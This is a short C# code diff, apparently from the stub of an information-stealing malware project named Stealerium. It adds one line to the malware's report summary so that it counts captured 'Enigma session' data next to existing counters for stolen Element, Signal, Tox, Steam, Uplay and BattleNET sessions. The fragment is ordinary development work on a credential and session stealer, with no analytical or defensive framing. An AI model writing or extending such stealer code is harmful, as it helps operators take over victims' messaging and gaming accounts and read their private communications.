@@ -367,6 +367,7 @@ namespace Stealerium.Stub
                        + Counter.GetSValue("💬 Element session", Counter.Element)
                        + Counter.GetSValue("💭 Signal session", Counter.Signal)
                        + Counter.GetSValue("🔓 Tox session", Counter.Tox)
+                       + Counter.GetSValue("🧩 Enigma session", Counter.Enigma)
                        + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                        + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
                        + Counter.GetSValue("🎮 BattleNET session", Counter.BattleNet)
